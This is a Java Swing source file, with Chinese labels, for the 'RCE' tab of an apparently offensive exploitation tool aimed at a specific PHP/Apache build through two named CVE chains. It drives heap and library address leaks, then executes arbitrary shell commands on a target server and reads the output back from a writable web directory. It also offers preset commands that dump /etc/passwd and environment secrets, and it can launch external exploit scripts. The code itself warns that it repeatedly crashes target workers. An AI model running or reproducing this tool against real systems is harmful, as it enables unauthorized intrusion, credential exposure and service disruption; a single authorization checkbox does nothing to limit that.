package p2s;

import javax.swing.*;
import java.awt.*;
import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.net.URI;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * RCE 页签：内置全链 或 外部脚本，二选一；单目标、一次一条命令。
 *
 * 设计约束（刻意的）：
 *  · 一次只对一个目标，不并入批量流程 —— 每条命令都要跑一次完整利用
 *  · 必须勾选授权确认才能执行
 *  · 命令输出走"写到可写 web 目录再读回"，所以目标上要有一个可写且可访问的目录
 */
public class RcePanel extends JPanel {

    private static final String[] PRESETS = {
            "id", "uname -a", "whoami; hostname", "ls -la /var/www/html",
            "cat /etc/passwd", "env", "ps aux", "ss -lntp", "cat /proc/self/environ",
    };

    /** 外部脚本的默认参数模板（兼容 78ResearchLab 的 exploit.py 命令行） */
    private static final String DEFAULT_TEMPLATE =
            "--host {host} --port {port} --path {path} --cmd \"{cmd}\" --fetch {fetchurl}";

    private final JTextField txtUrl = new JTextField(34);
    private final JTextField txtOutDir = new JTextField("/var/www/html/out", 16);
    private final JTextField txtUrlPath = new JTextField("/out", 7);
    private final JTextField txtR0Lo = new JTextField("0x50000", 7);
    private final JTextField txtR0Hi = new JTextField("0xC0000", 7);

    private final JRadioButton rbBuiltin = new JRadioButton("内置（Java 移植，无需 Python）", true);
    private final JRadioButton rbExternal = new JRadioButton("外部脚本（自备载荷）");
    private final JTextField txtInterp = new JTextField("python", 9);
    private final JTextField txtScript = new JTextField(38);
    private final JTextField txtTemplate = new JTextField(DEFAULT_TEMPLATE, 38);
    private final JButton btnBrowse = new JButton("浏览…");
    private final JButton btnHelp = new JButton("路径格式说明");

    private final JComboBox<String> cbPreset = new JComboBox<>(PRESETS);
    private final JComboBox<String> cbChain = new JComboBox<>(new String[]{
            "自动判定（推荐）", "强制 A：跨请求 RCE", "仅检出 B：同请求 teardown"});
    private final JTextField txtCmd = new JTextField("id", 22);
    private final JCheckBox chkAuth = new JCheckBox("我确认对该目标有书面授权");
    private final JButton btnLeak = new JButton("① 信息泄漏 / 验证");
    private final JButton btnRun = new JButton("② 执行命令");
    private final JButton btnClear = new JButton("清空日志");
    private final JTextArea log = new JTextArea();
    private final AtomicBoolean busy = new AtomicBoolean(false);
    private final RceEngine engine = new RceEngine();

    public RcePanel(MainFrame owner) {
        super(new BorderLayout(10, 8));
        setBorder(BorderFactory.createEmptyBorder(10, 12, 10, 12));

        JPanel top = new JPanel(new GridLayout(0, 1, 0, 4));

        JPanel warn = new JPanel(new FlowLayout(FlowLayout.LEFT, 0, 0));
        JLabel w = new JLabel("⚠ 内置/外部载荷都会让目标 worker 反复中止，且只对匹配构建有效（默认 php:8.4.26-apache）");
        w.setForeground(new Color(0xC0392B));
        warn.add(w);
        top.add(warn);

        /* ---- 载荷来源 ---- */
        JPanel src = new JPanel(new FlowLayout(FlowLayout.LEFT, 6, 0));
        src.setBorder(BorderFactory.createTitledBorder(BorderFactory.createEtchedBorder(),
                "载荷来源", javax.swing.border.TitledBorder.LEFT, javax.swing.border.TitledBorder.TOP));
        ButtonGroup bg = new ButtonGroup();
        bg.add(rbBuiltin);
        bg.add(rbExternal);
        src.add(rbBuiltin);
        src.add(rbExternal);
        src.add(new JLabel("解释器"));
        src.add(txtInterp);
        src.add(new JLabel("脚本"));
        src.add(txtScript);
        src.add(btnBrowse);
        src.add(btnHelp);
        top.add(src);

        JPanel tpl = new JPanel(new FlowLayout(FlowLayout.LEFT, 6, 0));
        tpl.setBorder(BorderFactory.createTitledBorder(BorderFactory.createEtchedBorder(),
                "外部脚本参数模板（仅外部脚本生效）", javax.swing.border.TitledBorder.LEFT,
                javax.swing.border.TitledBorder.TOP));
        tpl.add(new JLabel("参数"));
        tpl.add(txtTemplate);
        tpl.add(new JLabel("占位符：{host} {port} {path} {cmd} {fetchurl}"));
        top.add(tpl);

        /* ---- 目标与执行 ---- */
        JPanel p1 = new JPanel(new FlowLayout(FlowLayout.LEFT, 6, 0));
        p1.add(new JLabel("目标 URL"));
        p1.add(txtUrl);
        JButton bFromMain = new JButton("用检测页第一个目标");
        bFromMain.addActionListener(e -> {
            String t = owner.firstTarget();
            if (t != null) txtUrl.setText(t);
        });
        p1.add(bFromMain);
        top.add(p1);

        JPanel p2 = new JPanel(new FlowLayout(FlowLayout.LEFT, 6, 0));
        p2.add(new JLabel("可写输出目录(容器内)"));
        p2.add(txtOutDir);
        p2.add(new JLabel("对应 URL 路径"));
        p2.add(txtUrlPath);
        p2.add(new JLabel("r0 范围"));
        p2.add(txtR0Lo);
        p2.add(new JLabel("~"));
        p2.add(txtR0Hi);
        top.add(p2);

        JPanel p3 = new JPanel(new FlowLayout(FlowLayout.LEFT, 6, 0));
        p3.add(new JLabel("链路"));
        p3.add(cbChain);
        p3.add(new JLabel("命令"));
        p3.add(cbPreset);
        cbPreset.addActionListener(e -> txtCmd.setText(String.valueOf(cbPreset.getSelectedItem())));
        p3.add(txtCmd);
        p3.add(chkAuth);
        p3.add(btnLeak);
        p3.add(btnRun);
        p3.add(btnClear);
        top.add(p3);

        add(top, BorderLayout.NORTH);

        log.setEditable(false);
        log.setFont(new Font(Font.MONOSPACED, Font.PLAIN, 12));
        JPanel logP = new JPanel(new BorderLayout());
        logP.setBorder(BorderFactory.createTitledBorder(BorderFactory.createEtchedBorder(),
                "执行日志", javax.swing.border.TitledBorder.LEFT, javax.swing.border.TitledBorder.TOP));
        logP.add(new JScrollPane(log), BorderLayout.CENTER);
        add(logP, BorderLayout.CENTER);

        JLabel foot = new JLabel("提示：先点 ① 拿基址（chunk / libphp），再点 ② 执行命令；每条命令都会重扫 r0，耗时 20–60s。");
        foot.setForeground(new Color(0x6B7280));
        add(foot, BorderLayout.SOUTH);

        btnLeak.addActionListener(e -> run(true));
        btnRun.addActionListener(e -> run(false));
        btnClear.addActionListener(e -> {
            log.setText("");
            say("日志已清空 " + new java.text.SimpleDateFormat("HH:mm:ss").format(new java.util.Date()));
        });
        addTextPopup(log);
        btnBrowse.addActionListener(e -> pickScript());
        btnHelp.addActionListener(e -> showPathHelp());
        rbBuiltin.addActionListener(e -> syncSource());
        rbExternal.addActionListener(e -> syncSource());
        syncSource();
    }

    /* --------------------------- 载荷来源与校验 --------------------------- */
    private void syncSource() {
        boolean ext = rbExternal.isSelected();
        txtInterp.setEnabled(ext);
        txtScript.setEnabled(ext);
        txtTemplate.setEnabled(ext);
        btnBrowse.setEnabled(ext);
        btnHelp.setEnabled(ext);
        if (ext) {
            say("已切换到外部脚本。填好脚本路径后，工具用「解释器 + 脚本 + 参数模板」调用它；"
                    + "点「路径格式说明」看示例。");
        }
    }

    private void pickScript() {
        JFileChooser fc = new JFileChooser();
        fc.setDialogTitle("选择外部载荷脚本（.py / .exe / .bat / .sh 均可）");
        File start = new File(".");
        String cur = cleanPath(txtScript.getText());
        if (!cur.isEmpty() && new File(cur).isFile()) start = new File(cur);
        fc.setCurrentDirectory(start.getParentFile() == null ? new File(".") : start.getParentFile());
        if (fc.showOpenDialog(this) == JFileChooser.APPROVE_OPTION) {
            // 用绝对路径 + 不加引号（工具会自己处理空格）
            txtScript.setText(fc.getSelectedFile().getAbsolutePath());
            say("已选择脚本：" + fc.getSelectedFile().getAbsolutePath());
        }
    }

    /** 去掉用户可能带上的引号/首尾空格，并把相对路径按当前目录解析 */
    static String cleanPath(String s) {
        if (s == null) return "";
        String t = s.trim();
        if (t.length() >= 2 && ((t.startsWith("\"") && t.endsWith("\"")) || (t.startsWith("'") && t.endsWith("'")))) {
            t = t.substring(1, t.length() - 1).trim();
        }
        return t;
    }

    static File resolveScript(String raw) {
        String p = cleanPath(raw);
        if (p.isEmpty()) return null;
        File f = new File(p);
        if (!f.isAbsolute()) f = new File(System.getProperty("user.dir"), p);
        return f.isFile() ? f : null;
    }

    private void showPathHelp() {
        String msg = """
                外部脚本路径怎么填（工具会自动处理引号与空格）：

                  D:\\tools\\exploit.py                              ← 推荐：绝对路径
                  C:\\Users\\me\\Desktop\\poc\\run.py                  ← 路径里有中文/空格都可以
                  "D:\\My Tools\\exploit.py"                        ← 带引号也行（工具会去掉）
                  exploit.py                                        ← 相对路径：相对启动目录
                  poc\\exploit.py                                    ← 相对路径（放在工具同级 poc/ 下）

                解释器（txtInterp）：
                  .py  脚本 → 填 python（或 C:\\Python310\\python.exe）
                  .exe        → 解释器留空，直接执行脚本
                  .bat/.sh    → 解释器填 cmd /c  或  bash

                参数模板里可用的占位符（点"① 信息泄漏 / 验证"或"② 执行命令"时替换）：
                  {host}      目标主机名/IP
                  {port}      端口
                  {path}      URL 路径（如 /index.php）
                  {cmd}       已经包好重定向的命令，例如：id > /var/www/html/out/o1234.txt 2>&1
                  {fetchurl}  回读输出用的 URL 路径，例如：/out/o1234.txt

                约定：脚本执行后，工具会按 {fetchurl} 去 GET 命令输出；
                      取不到就把脚本的标准输出当作结果。
                      默认模板就是 78ResearchLab 的 exploit.py 命令行，可直接用。
                """;
        JTextArea ta = new JTextArea(msg, 24, 78);
        ta.setEditable(false);
        ta.setFont(new Font(Font.MONOSPACED, Font.PLAIN, 12));
        JOptionPane.showMessageDialog(this, new JScrollPane(ta), "外部脚本路径与参数格式",
                JOptionPane.INFORMATION_MESSAGE);
    }

    /* ------------------------------ 执行 ------------------------------ */
    /** 给任意文本区挂右键菜单：复制全部 / 另存为 / 清空（检测页也复用） */
    public static void addTextPopup(JTextArea ta) {
        JPopupMenu m = new JPopupMenu();
        JMenuItem miCopy = new JMenuItem("复制全部");
        miCopy.addActionListener(e -> {
            ta.selectAll();
            ta.copy();
            ta.setCaretPosition(ta.getDocument().getLength());
        });
        JMenuItem miSave = new JMenuItem("另存为…");
        miSave.addActionListener(e -> {
            JFileChooser fc = new JFileChooser();
            fc.setSelectedFile(new File("p2s-log.txt"));
            if (fc.showSaveDialog(ta) == JFileChooser.APPROVE_OPTION) {
                try {
                    java.nio.file.Files.writeString(fc.getSelectedFile().toPath(), ta.getText(),
                            StandardCharsets.UTF_8);
                } catch (Exception ex) {
                    JOptionPane.showMessageDialog(ta, "保存失败：" + ex.getMessage());
                }
            }
        });
        JMenuItem miClear = new JMenuItem("清空");
        miClear.addActionListener(e -> ta.setText(""));
        m.add(miCopy);
        m.add(miSave);
        m.addSeparator();
        m.add(miClear);
        ta.setComponentPopupMenu(m);
    }

    private void say(String s) {
        SwingUtilities.invokeLater(() -> {
            log.append(s + System.lineSeparator());
            log.setCaretPosition(log.getDocument().getLength());
        });
    }

    private boolean guard() {
        if (!chkAuth.isSelected()) {
            JOptionPane.showMessageDialog(this, "先勾选授权确认。", "需要授权", JOptionPane.WARNING_MESSAGE);
            return false;
        }
        if (txtUrl.getText().isBlank()) {
            JOptionPane.showMessageDialog(this, "填目标 URL（如 http://host:8090/index.php）", "缺少目标",
                    JOptionPane.WARNING_MESSAGE);
            return false;
        }
        if (rbExternal.isSelected()) {
            File f = resolveScript(txtScript.getText());
            if (f == null) {
                JOptionPane.showMessageDialog(this,
                        "外部脚本路径无法解析：" + cleanPath(txtScript.getText()) + "\n\n"
                                + "请填脚本的绝对路径，例如：\n"
                                + "  D:\\tools\\exploit.py\n"
                                + "带空格可以加引号：\"D:\\My Tools\\exploit.py\"\n"
                                + "或点「浏览…」选择，点「路径格式说明」看全部规则。",
                        "脚本路径无效", JOptionPane.WARNING_MESSAGE);
                return false;
            }
            txtScript.setText(f.getAbsolutePath());
        }
        return true;
    }

    private void run(boolean leakOnly) {
        if (!guard() || busy.get()) return;
        busy.set(true);
        btnLeak.setEnabled(false);
        btnRun.setEnabled(false);

        String url = txtUrl.getText().trim();
        String outDir = txtOutDir.getText().trim();
        String urlPath = txtUrlPath.getText().trim();
        String cmd = txtCmd.getText().trim();
        int lo = parseInt(txtR0Lo.getText(), 0x50000);
        int hi = parseInt(txtR0Hi.getText(), 0xC0000);
        int[] lowbits = {0x160, 0x100, 0x130, 0x190};
        boolean external = rbExternal.isSelected();
        String script = cleanPath(txtScript.getText());
        String interp = txtInterp.getText().trim();
        String template = txtTemplate.getText();
        int mode = cbChain.getSelectedIndex();   // 0=自动 1=强制A 2=仅检出B

        new Thread(() -> {
            try {
                if (external) {
                    say("=== 外部脚本模式 ===");
                    String out = runExternal(url, leakOnly ? "id" : cmd, outDir, urlPath,
                            interp, script, template);
                    say("--- 输出 ---");
                    say(out == null || out.isBlank() ? "<空>" : out);
                } else if (mode == 2) {
                    say("=== 仅检出：B 链（同请求 teardown，CVE-2026-109618）===");
                    RceEngine.ChainProbe cp = engine.probeChain(url);
                    sayProbe(cp);
                } else if (mode == 1) {
                    if (leakOnly) {
                        say("=== 信息泄漏（A 链，跨请求，CVE-2026-109619 路径）===");
                        RceEngine.Leak lk = engine.leakOnce(url, 3);
                        if (!lk.ok()) {
                            say(String.format("泄漏失败：chunk=0x%x libphp=0x%x", lk.chunk, lk.libphp));
                            say("  stage1：" + (lk.stage1LooksLikeFreshSid()
                                    ? "拿回服务端新建的会话 id（脏指针没被消费）"
                                    : lk.stage1RawLen + " 字节"));
                        } else {
                            say(String.format("chunk=0x%x  libphp=0x%x  zif_system=0x%x",
                                    lk.chunk, lk.libphp, lk.libphp + RceEngine.ZIF_OFF));
                            say("→ 可以执行命令了");
                        }
                    } else {
                        say("=== 执行（A 链）: " + cmd + " ===");
                        String out = engine.exec(url, cmd, outDir, urlPath, lo, hi, lowbits, this::say);
                        say("");
                        say("--- 输出 ---");
                        say(out == null || out.isBlank() ? "<空>" : out);
                    }
                } else {
                    if (leakOnly) {
                        say("=== 自动判定链路 ===");
                        sayProbe(engine.probeChain(url));
                    } else {
                        say("=== 自动判定 + 执行: " + cmd + " ===");
                        String out = engine.execAuto(url, cmd, outDir, urlPath, lo, hi, lowbits, this::say);
                        say("");
                        say("--- 输出 ---");
                        say(out == null || out.isBlank() ? "<空>" : out);
                    }
                }
            } catch (Exception ex) {
                say("异常: " + ex);
            } finally {
                SwingUtilities.invokeLater(() -> {
                    busy.set(false);
                    btnLeak.setEnabled(true);
                    btnRun.setEnabled(true);
                });
            }
        }, "rce-worker").start();
    }

    private void sayProbe(RceEngine.ChainProbe cp) {
        say("  版本       : " + (cp.version.isEmpty() ? "未知" : cp.version));
        say("  启动期 OOM : " + cp.startupOom + "    worker 存活: " + cp.workerAlive);
        say("  A 链夺堆   : " + cp.leakOk + "     B 链破坏: " + cp.teardownDamage);
        say("  判定       : " + cp.chain + " — " + cp.note);
    }

    /* ---------------------------- 外部脚本调用 ---------------------------- */
    private String runExternal(String url, String cmd, String outDir, String urlPath,
                              String interp, String script, String template) throws Exception {
        return runExternalStatic(url, cmd, outDir, urlPath, interp, script, template, this::say);
    }

    /** 供 GUI 与 CLI 共用：按模板拼参数、调外部脚本、回读输出 */
    public static String runExternalStatic(String url, String cmd, String outDir, String urlPath,
                                           String interp, String script, String template,
                                           java.util.function.Consumer<String> log) throws Exception {
        java.util.function.Consumer<String> say = log == null ? s -> { } : log;
        URI u = URI.create(url.startsWith("http") ? url : "http://" + url);
        String host = u.getHost();
        int port = u.getPort() > 0 ? u.getPort() : ("https".equals(u.getScheme()) ? 443 : 80);
        String path = (u.getPath() == null || u.getPath().isEmpty()) ? "/index.php" : u.getPath();

        String name = "o" + Integer.toHexString((int) (System.currentTimeMillis() & 0xffffff));
        String wrapped = cmd + " > " + outDir + "/" + name + ".txt 2>&1";
        String fetchurl = urlPath + "/" + name + ".txt";

        String args = template
                .replace("{host}", host)
                .replace("{port}", String.valueOf(port))
                .replace("{path}", path)
                .replace("{cmd}", wrapped)
                .replace("{fetchurl}", fetchurl);

        List<String> argv = new ArrayList<>();
        if (interp != null && !interp.isBlank()) argv.add(interp);
        argv.add(script);
        argv.addAll(splitArgs(args));

        say.accept("$ " + String.join(" ", argv));
        ProcessBuilder pb = new ProcessBuilder(argv).redirectErrorStream(true);
        pb.environment().put("PYTHONIOENCODING", "utf-8");
        Process p = pb.start();
        StringBuilder sb = new StringBuilder();
        try (BufferedReader br = new BufferedReader(
                new InputStreamReader(p.getInputStream(), StandardCharsets.UTF_8))) {
            String line;
            while ((line = br.readLine()) != null) {
                if (!line.isBlank()) say.accept("  " + line);
                sb.append(line).append('\n');
            }
        }
        int rc = p.waitFor();
        say.accept("  退出码 " + rc);

        String got = fetchStatic(url, fetchurl);
        if (got != null && !got.isBlank()) {
            say.accept("  回读到 " + fetchurl);
            return got;
        }
        return sb.toString().isBlank()
                ? "（脚本无输出，且未从 " + fetchurl + " 读到内容）" : sb.toString();
    }

    /** 简易命令行分词：尊重双引号与单引号 */
    static List<String> splitArgs(String s) {
        List<String> out = new ArrayList<>();
        StringBuilder cur = new StringBuilder();
        char quote = 0;
        for (char c : s.toCharArray()) {
            if (quote != 0) {
                if (c == quote) quote = 0; else cur.append(c);
            } else if (c == '"' || c == '\'') {
                quote = c;
            } else if (Character.isWhitespace(c)) {
                if (cur.length() > 0) { out.add(cur.toString()); cur.setLength(0); }
            } else {
                cur.append(c);
            }
        }
        if (cur.length() > 0) out.add(cur.toString());
        return out;
    }

    private static String fetchStatic(String base, String path) {
        try {
            String url = base.startsWith("http") ? base : "http://" + base;
            int slash = url.indexOf('/', url.indexOf("://") + 3);
            String origin = slash > 0 ? url.substring(0, slash) : url;
            Probe.Resp r = Probe.get(origin + path, 15000);
            if (r.status == 200) return new String(r.body, StandardCharsets.UTF_8);
            return null;
        } catch (Exception e) {
            return null;
        }
    }

    private static int parseInt(String s, int dflt) {
        try {
            s = s.trim();
            return s.startsWith("0x") || s.startsWith("0X")
                    ? (int) Long.parseLong(s.substring(2), 16) : Integer.parseInt(s);
        } catch (Exception e) {
            return dflt;
        }
    }

    public void setTarget(String url) { txtUrl.setText(url); }

    /* ------------------------ 自检接口（--logcheck 用） ------------------------ */
    public void dbgAppend(String s) { say(s); }
    public String dbgText() { return log.getText(); }
    public JButton dbgClearButton() { return btnClear; }
}
